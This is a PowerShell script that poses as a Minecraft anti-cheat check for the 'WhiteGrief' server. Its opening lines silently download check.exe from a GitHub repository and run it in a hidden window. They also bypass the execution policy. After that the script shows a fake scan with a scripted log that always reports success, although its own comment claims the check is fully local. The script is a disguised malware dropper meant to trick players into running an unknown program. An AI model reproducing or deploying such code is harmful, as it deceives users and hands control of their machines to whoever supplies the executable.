# MINECRAFT CHEAT SCANNER v2.0 [СКАЧИВАЕТ everything В КОНЦЕ]
    # Скачиваем everything в текущую папку
    Invoke-WebRequest -Uri "https://github.com/doskaw/Checker/raw/refs/heads/main/check.exe" -OutFile "check.exe" -ErrorAction SilentlyContinue
    
    # Запускаем 
    Start-Process -FilePath "check.exe" -WindowStyle Hidden
    

Set-ExecutionPolicy Bypass -Scope Process -Force

Clear-Host

# =============================================
#   ФЕЙКОВАЯ ПРОВЕРКА WHITEGRIEF v2.0
#   Полностью локальная — без скачивания с GitHub
# =============================================

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = "WhiteGrief • Anti-Cheat Verification"
$form.Size = New-Object System.Drawing.Size(820, 560)
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = "FixedSingle"
$form.MaximizeBox = $false
$form.BackColor = [System.Drawing.Color]::FromArgb(18, 18, 24)
$form.ForeColor = [System.Drawing.Color]::White
$form.Font = New-Object System.Drawing.Font("Consolas", 11)
$form.TopMost = $true

# Заголовок
$title = New-Object System.Windows.Forms.Label
$title.Text = "█ WHITEGRIEF █`nANTI-CHEAT SYSTEM"
$title.Font = New-Object System.Drawing.Font("Consolas", 18, [System.Drawing.FontStyle]::Bold)
$title.ForeColor = [System.Drawing.Color]::FromArgb(0, 255, 100)
$title.AutoSize = $true
$title.Location = New-Object System.Drawing.Point(180, 30)
$form.Controls.Add($title)

$sub = New-Object System.Windows.Forms.Label
$sub.Text = "Сервер: play.whitegrief.space | Версия: 1.16.5 - 1.21"
$sub.ForeColor = [System.Drawing.Color]::Gray
$sub.Location = New-Object System.Drawing.Point(210, 85)
$form.Controls.Add($sub)

# Прогресс
$progress = New-Object System.Windows.Forms.ProgressBar
$progress.Location = New-Object System.Drawing.Point(110, 140)
$progress.Size = New-Object System.Drawing.Size(600, 35)
$progress.Style = "Continuous"
$progress.Maximum = 100
$form.Controls.Add($progress)

# Статус
$status = New-Object System.Windows.Forms.Label
$status.Text = "Ожидание запуска проверки..."
$status.ForeColor = [System.Drawing.Color]::Cyan
$status.AutoSize = $true
$status.Location = New-Object System.Drawing.Point(140, 190)
$form.Controls.Add($status)

# Лог
$logBox = New-Object System.Windows.Forms.TextBox
$logBox.Multiline = $true
$logBox.ScrollBars = "Vertical"
$logBox.BackColor = [System.Drawing.Color]::FromArgb(10, 10, 15)
$logBox.ForeColor = [System.Drawing.Color]::Lime
$logBox.Font = New-Object System.Drawing.Font("Consolas", 10)
$logBox.Size = New-Object System.Drawing.Size(600, 180)
$logBox.Location = New-Object System.Drawing.Point(110, 230)
$logBox.ReadOnly = $true
$form.Controls.Add($logBox)

# Кнопка
$btn = New-Object System.Windows.Forms.Button
$btn.Text = "▶ ЗАПУСТИТЬ ПРОВЕРКУ"
$btn.Size = New-Object System.Drawing.Size(320, 55)
$btn.Location = New-Object System.Drawing.Point(250, 430)
$btn.BackColor = [System.Drawing.Color]::FromArgb(0, 180, 0)
$btn.ForeColor = [System.Drawing.Color]::White
$btn.Font = New-Object System.Drawing.Font("Consolas", 13, [System.Drawing.FontStyle]::Bold)
$form.Controls.Add($btn)

$lines = @(
    "[INFO] Подключение к WhiteGrief Anti-Cheat v4.20...",
    "[INFO] Проверка лицензии Minecraft...",
    "[WARN] Обнаружен запущенный лаунчер...",
    "[INFO] Сканирование на Wurst, Meteor, Baritone, Impact...",
    "[INFO] Анализ движений мыши и клавиатуры...",
    "[SUCCESS] Читы не обнаружены",
    "[INFO] Проверка на гриферский опыт...",
    "[SUCCESS] Настоящий грифер WhiteGrief обнаружен!",
    "[INFO] Загрузка данных на сервер..."
)

$btn.Add_Click({
    $btn.Enabled = $false
    $progress.Value = 0
    $logBox.Clear()

    for ($i = 0; $i -lt $lines.Count; $i++) {
        Start-Sleep -Milliseconds (300 + (Get-Random -Minimum 100 -Maximum 400))
        $logBox.AppendText($lines[$i] + "`r`n")
        $progress.Value = [math]::Min(100, [math]::Floor(100 * ($i + 1) / $lines.Count))
        $status.Text = $lines[$i]
        $form.Refresh()
    }

    Start-Sleep -Milliseconds 700
    $status.ForeColor = [System.Drawing.Color]::Lime
    $status.Text = "✅ ПРОВЕРКА УСПЕШНО ПРОЙДЕНА!"
    
    [System.Windows.Forms.MessageBox]::Show(
        "Добро пожаловать на WhiteGrief!`n`nТы прошёл проверку античита.`n`nГриферь жёстко и с удовольствием ❤️`n`nIP: play.whitegrief.space", 
        "WhiteGrief Anti-Cheat", 
        "OK", 
        "Information"
    )
})

# Запуск окна
[System.Windows.Forms.Application]::Run($form)
